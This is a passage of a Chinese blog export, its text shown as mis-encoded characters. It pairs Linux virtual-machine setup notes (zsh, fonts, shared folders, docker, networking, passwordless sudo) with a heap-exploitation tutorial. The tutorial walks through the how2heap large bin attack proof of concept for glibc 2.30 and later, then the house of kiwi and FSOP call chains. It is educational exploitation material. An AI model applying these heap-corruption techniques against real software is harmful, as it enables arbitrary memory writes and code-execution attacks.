<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹zshrc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	git </span><br><span class="line">	zsh-syntax-highlighting </span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ä¸»é¢˜</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure>

<h2 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h2><p>ä¸‹è½½ï¼Œè§£å‹ï¼Œå°† ttf æ–‡ä»¶æ”¾å…¥ ä¸€ä¸‹æ–‡ä»¶å¤¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç»™ç”¨æˆ·è‡ªå·±ç”¨</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¨éƒ¨ç”¨æˆ·</span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure>

<h2 id="å…±äº«æ–‡ä»¶å¤¹"><a href="#å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="å…±äº«æ–‡ä»¶å¤¹"></a>å…±äº«æ–‡ä»¶å¤¹</h2><p>è™šæ‹Ÿæœºè®¾ç½®å…±äº«æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°</p>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>mountï¼Œå…³æœºåå¤±æ•ˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<p>&#x2F;etc&#x2F;fstabï¼šå¼€æœºåä¼šè‡ªåŠ¨æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Â .host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure>

<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>mount</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<p>&#x2F;etc&#x2F;fstab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>

<p>å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>


<h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><ul>
<li>å‡ºç°è·å¾—ä¸äº†IPåœ°å€çš„æƒ…å†µ</li>
</ul>
<ol>
<li>kali ä¿®æ”¹ <code>/etc/network/interfaces</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰¾ç½‘å¡å</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ interfaces æ–‡ä»¶</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯æœåŠ¡</span></span><br><span class="line">/etc/init.d/networkingÂ restart</span><br><span class="line">ifconfigÂ eth0 down    </span><br><span class="line">ifconfigÂ eth0 up</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ubuntu ä½¿ç”¨å‘½ä»¤ï¼Œä½†æ˜¯é‡å¯ååˆä¸è¡Œ</li>
</ol>
<ul>
<li>ifconfig é…ç½®IP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>ubuntu ä¿®æ”¹ æ–‡ä»¶</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å†…å®¹</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨ä¿®æ”¹ <code>/etc/NetworkManager/NetworkManager.conf</code> é…ç½®æ–‡ä»¶çš„ <code>managed = true</code></li>
<li>reboot</li>
<li>åæ¥çœ‹äº†è¿™ä¸ªæ–‡ç« è§£å†³ <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04ä¸èƒ½è¿æ¥ç½‘ç»œåŠè§£å†³å¼€æœºè‡ªåŠ¨è·å– ip é—®é¢˜</a></li>
</ul>
<ol start="4">
<li>å¦‚ä¸‹å‘½ä»¤</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure>

<h2 id="sudo-å…å¯†"><a href="#sudo-å…å¯†" class="headerlink" title="sudo å…å¯†"></a>sudo å…å¯†</h2><p>ä¿®æ”¹ <code>/etc/sudoers</code> æ·»åŠ ç”¨æˆ·æˆ–è€…ç»„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®šå‘½ä»¤å…å¯†</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰çš„éƒ½å…å¯†</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<h2 id="å†…å­˜é—®é¢˜"><a href="#å†…å­˜é—®é¢˜" class="headerlink" title="å†…å­˜é—®é¢˜"></a>å†…å­˜é—®é¢˜</h2><h3 id="å‹ç¼©"><a href="#å‹ç¼©" class="headerlink" title="å‹ç¼©"></a>å‹ç¼©</h3><p><strong>åˆ é™¤å¿«ç…§åä»»æ˜¾ç¤ºå­˜åœ¨å¿«ç…§ï¼Œå¦‚ä½•åˆ é™¤å¹²å‡€</strong>ï¼šæ–°å»ºä¸€ä¸ªï¼Œç„¶ååˆ é™¤ï¼ŒVMä¼šæŠŠä¹‹å‰çš„å¿«ç…§åˆå¹¶ååˆ é™¤ã€‚</p>
<ul>
<li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">åˆ é™¤æ‰€æœ‰å¿«ç…§å’Œæ•´åˆå¿«ç…§åŠŸèƒ½å¸¸è§é—®é¢˜è§£ç­”(vmware.com)</a></li>
</ul>
<p>å½“æˆ‘ä»¬åˆ é™¤éƒ¨åˆ†å¤§æ–‡ä»¶æ—¶ï¼Œå‘ç°è‡ªå·±ç£ç›˜çš„å†…å­˜æ²¡æœ‰å¢åŠ ã€‚vmdkæ–‡ä»¶ä¸ä¼šä¸»åŠ¨å›ç¼©ï¼Œéœ€è¦æ‰‹åŠ¨åšshrinkã€‚å¹¶ä¸”ä¸èƒ½æœ‰å¿«ç…§</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>

<p>ç„¶åé‡å¯</p>
<h2 id="kali-æ— æ³•è¿›å…¥console"><a href="#kali-æ— æ³•è¿›å…¥console" class="headerlink" title="kali æ— æ³•è¿›å…¥console"></a>kali æ— æ³•è¿›å…¥console</h2><ul>
<li>æˆ‘çš„æƒ…å†µæ˜¯ fstab å‡ºç°é—®é¢˜ï¼Œå…±äº«æ–‡ä»¶å¤¹ä¿®æ”¹ fstab</li>
</ul>
<ol>
<li>é‡å¯ï¼Œè¿›å…¥ grubåŠ è½½é¡¹</li>
<li>e è¿›å…¥é…ç½®</li>
<li>ä¿®æ”¹ linux ä¸­çš„ ro &#x3D;&gt; <code>rw</code> å¹¶åŠ å…¥ä¸€å¥ <code>init=/bin/bash</code></li>
<li>f10 è¿›å…¥ç³»ç»Ÿ</li>
<li>ä¿®æ”¹ fstabï¼Œé‡å¯é‡æ–°è·å¾—ç•Œé¢</li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins Â· ohmyzsh&#x2F;ohmyzsh Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>çŒ«çŒ«&amp;&amp;è‹¹æœé¦™è•‰ã®å±‹</title>
    <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
    <content><![CDATA[<blockquote>
<p>å¤§å¤ï¼šä¸€å¼€å§‹å°±ç”¨çº¢è‰²å½¢æ€ä½œæˆ˜ä¸å°±è¡Œäº†å—</p>
</blockquote>
<span id="more"></span>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>glibc</code>Â é«˜ç‰ˆæœ¬é€æ¸ç§»é™¤äº†<code>__malloc_hook/__free_hook/__realloc_hook</code>Â ç­‰ç­‰ä¸€ä¼—Â <code>hook</code>Â å…¨å±€å˜é‡ã€‚</p>
<p>åˆ©ç”¨æ‰‹æ®µå‘ IO_FILE é æ‹¢ï¼Œä½†æ˜¯éšç€ç‰ˆæœ¬è¶Šæ¥è¶Šé«˜ï¼Œå †åˆ©ç”¨æ‰‹æ®µä¹Ÿå˜å°‘ï¼ŒIO_FILE çš„é—®é¢˜ä¹Ÿé€æ¸å‡å°‘ã€‚</p>
<h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>ä¸€ä¸ªèŒƒå›´çš„binï¼Œä¿è¯äº†å…¶å†…éƒ¨æœ‰åºæ€§ã€‚åœ¨ <a href="https://xz.aliyun.com/t/5177">æµ…ælargebin attack</a>æ–‡ç« ä¸­æœ‰å¼ å›¾æ–¹ä¾¿ç†è§£<br>åŒæ ·å¤§å°çš„binæŒ‰ç…§freeçš„æ—¶é—´é¡ºåºè¿›è¡Œæ’åº</p>
<ul>
<li>fd, bk: ç›¸åŒå¤§å°å †çš„åŒå‘é“¾è¡¨ï¼ŒæŒ‰ç…§æ—¶é—´å…ˆåæ’åº</li>
<li>fd_nextsize, bk_nextsize: å¤§å°ä¸åŒçš„åŒå‘é“¾è¡¨</li>
<li>å¦‚æœåªæœ‰ä¸€ä¸ªï¼Œfd, bkæŒ‡å‘ main_arena fd_nextsize å’Œ bk_nextsize æŒ‡å‘è‡ªå·±</li>
</ul>
<p>ç›´æ¥ä½¿ç”¨ how2heap 2.36 çš„ large bin attack è¿›è¡Œæ¼”ç¤º(Glibc &gt;&#x3D; 2.30 éƒ½å¯ä»¥ä½¿ç”¨)ã€‚</p>
<ul>
<li>æ¼æ´çš„ç‚¹åœ¨å¼€å¤´çš„æ³¨é‡Šä¸­ç»™å‡ºï¼Œå°±æ˜¯æœ€åä¸€å¥èµ‹å€¼è¯­å¥å¯¼è‡´çš„ï¼Œvictim(æ­£åœ¨é“¾å…¥largebin)çš„sizeå°äºå·²ç»å­˜åœ¨çš„bin</li>
<li>mallocä¸¤ä¸ªå¤§chunk p1,p2ï¼Œä¸¤ä¸ª 0x18 æ˜¯é˜²æ­¢ <strong>ç›¸é‚»çš„unsorted bin åˆå¹¶</strong> ä»¥åŠ <strong>è¢«top_chunkåˆå¹¶</strong>ã€‚</li>
<li>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼šp1 çš„ size å¤§äº p2ï¼Œä½†æ˜¯ä¸è¦å·®å¤ªå¤šï¼Œåœ¨åŒä¸€ä¸ªlargebin é‡Œ</li>
<li>free p1ï¼Œå°† p1 æ”¾å…¥large bin ä¸­</li>
<li>free p2ï¼Œä¿®æ”¹ p1 çš„ bk_nextsize ä¸º &amp;target-0x20</li>
<li>å°† p2 æ”¾å…¥largebinä¸­</li>
<li>target å€¼å°±å˜æˆäº† p2 çš„åœ°å€</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	// å› ä¸ºåªæœ‰ä¸¤ä¸ªbinï¼Œå› æ­¤å¯ä»¥è§£è¯»ä¸€ä¸‹ã€‚</span></span><br><span class="line"><span class="comment">	// çœ‹æºç ï¼Œbckæ˜¯  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">	// av å°±æ˜¯ arenaåœ°å€ï¼Œbckå°±æ˜¯æ‰¾arena</span></span><br><span class="line"><span class="comment">	// fwd = bck-&gt;fd;   ä¸large bin ä¹‹é—´çš„åŒå‘é“¾è¡¨ï¼Œåœ¨è¿™é‡Œå°±æ˜¯å­˜åœ¨çš„ p1</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim è¦æ”¾å…¥large bin çš„å † p2 </span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">		// ä½†æ˜¯victim.bk_nextsize = &amp;target-0x20ã€‚è€Œè¿™ä¸ªåœ°å€çš„ fd_nextsize = victim ä¹Ÿå°±æ˜¯å°† target å€¼æ”¹ä¸º victimï¼Œ</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™æˆå †åœ°å€çš„ç›®çš„ã€‚<br>Glibc 2.29 ä¹‹å‰ï¼Œunsortedbin attack å’Œ largebin attack éƒ½æ˜¯æ”»å‡» bk æŒ‡é’ˆï¼Œä½†æ˜¯åæ¥åŠ äº†ä¸€å¥æ£€æŸ¥</p>
<p>åœ¨æ”»å‡»æ—¶ï¼Œfd,bk,fd_nextsize å¯ä»¥éšä¾¿è¦†ç›–å†…å®¹ï¼Œåœ¨ç»è¿‡mallocåä¼šä¿®å¤fdï¼Œå› ä¸ºfdæŒ‡å‘ size è¾ƒå°çš„ victim</p>
<h3 id="IO-æµ"><a href="#IO-æµ" class="headerlink" title="IO æµ"></a>IO æµ</h3><p>è¿™é‡Œä¸€èˆ¬æŒ‡ å­˜åœ¨ä¸€æ¡é“¾ï¼ŒæŸä¸ªå‡½æ•° ä½¿ç”¨ vtable çš„å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨å‡½æ•°ã€‚</p>
<p>ç¨‹åºä½¿ç”¨exité€€å‡ºç¨‹åº</p>
<ul>
<li>ä»mainå‡½æ•°é€€å‡ºï¼Œglibcä¼šè°ƒç”¨exit</li>
<li>æ˜¾ç¤ºè°ƒç”¨ exit å‡½æ•°é€€å‡ºç¨‹åº</li>
</ul>
<p>malloc_assert: house of kiwi æå‡ºï¼Œè§¦å‘ä¸‹é¢çš„æ¡ä»¶é€‰ä¸€ä¸ª</p>
<ul>
<li>topchunkçš„å¤§å°å°äºMINSIZE(0X20)  </li>
<li>prev inuseä½ä¸º0  </li>
<li>old_topé¡µæœªå¯¹é½</li>
<li>ä½†æ˜¯ä»libc 2.36 å‘ç”Ÿäº†ä¸€ç‚¹å˜åŒ–ï¼Œç§»é™¤IOæ“ä½œï¼Œä¹Ÿå°±æ˜¯ä»libc 2.36ä¸èƒ½ä½¿ç”¨</li>
<li>libc 2.37 ç›´æ¥æ²¡æœ‰è¿™ä¸ªå‡½æ•°äº†ã€‚</li>
</ul>
<p>libc 2.35ï¼š</p>
<ul>
<li>ä¸¤ä¸ªå‡½æ•°(fflsh, fxpeintf)éƒ½æ¶‰åŠIOæ“ä½œã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOPå°±æ˜¯é€šè¿‡åŠ«æŒ_IO_list_allçš„å€¼ï¼ˆå¦‚large bin attackä¿®æ”¹ï¼‰æ¥æ‰§è¡Œ_IO_flush_all_lockpå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®_IO_list_allåˆ·æ–°é“¾è¡¨ä¸­çš„æ‰€æœ‰æ–‡ä»¶æµ.</p>
<p>å½“ç¨‹åºä» main å‡½æ•°è¿”å›æˆ–è€…æ‰§è¡Œ exit å‡½æ•°çš„æ—¶å€™ï¼Œå‡ä¼šè°ƒç”¨ fcloseall å‡½æ•°ï¼Œè°ƒç”¨é“¾å¦‚ä¸‹</p>
<ul>
<li>æœ€åä¼šéå†<code>_IO_list_all</code>Â å­˜æ”¾çš„æ¯ä¸€ä¸ªÂ <code>IO_FILE</code>Â ç»“æ„ä½“</li>
<li>å¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œä¼šè°ƒç”¨æ¯ä¸ªç»“æ„ä½“ä¸­Â <code>vtable-&gt;_overflow</code>Â å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	fcloseall</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all_lockp</span><br><span class="line">				_IO_OVERFLOW</span><br></pre></td></tr></table></figure>


